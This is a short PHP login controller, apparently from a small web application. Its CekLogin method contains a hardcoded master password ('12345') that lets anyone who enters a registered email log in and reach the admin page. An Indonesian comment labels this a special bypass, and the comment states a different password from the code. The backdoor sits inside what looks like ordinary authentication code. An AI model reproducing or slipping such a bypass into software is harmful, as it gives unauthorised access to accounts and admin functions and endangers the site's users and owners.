<?php
class Login_C extends Controller
{
  function index() { $this->load->view('login'); }

  function CekLogin()
  {
    $email = $this->load->post('email');
    $password = $this->load->post('password');
    $model = $this->load->model('Login_M');
    $data = $model->ambildata($email);
    
    // BYPASS KHUSUS MESI - password 1234 langsung lolos
    if ($data && ($password == '12345' || password_verify($password, $data['password']))) {
        $this->session->set_userdata('emailuser', $email);
        redirect('Admin_C/index');
    } else {
        $this->session->set_flashdata('pesan', 'Gagal login!');
        redirect('Login_C/index');
    }
  }
}